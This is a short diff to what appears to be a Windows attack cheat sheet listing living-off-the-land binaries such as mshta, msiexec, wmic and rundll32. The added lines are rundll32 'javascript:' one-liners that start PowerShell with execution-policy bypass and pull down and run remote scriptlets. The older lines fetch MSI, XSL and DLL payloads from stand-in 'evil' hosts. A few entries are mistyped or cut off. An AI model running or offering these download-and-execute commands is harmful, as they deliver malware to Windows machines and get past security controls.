@@ -10,6 +10,7 @@ MSHTA
 Powershell
 msiexec
 wmic
+rundll32.exe
 
 
 Usage :
@@ -20,6 +21,10 @@ MSIEXEC /j m evil[.]msi
 msiexec /q /i http[:]//evil/evil[.]msi 
 wmic os get /FORMAT:"http://evil/evil[.]xsl"
 rundll3.exe \\evil\evil.dll,0
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop 
+ -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://evil/evil.sct');"
+rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject
+    ("script:https[:]//www[.]example[.]com/malicious.sct")" 
 Powershell:Invoke-WebRequest -Uri $url -OutFile $outpu
 Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output
 Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous
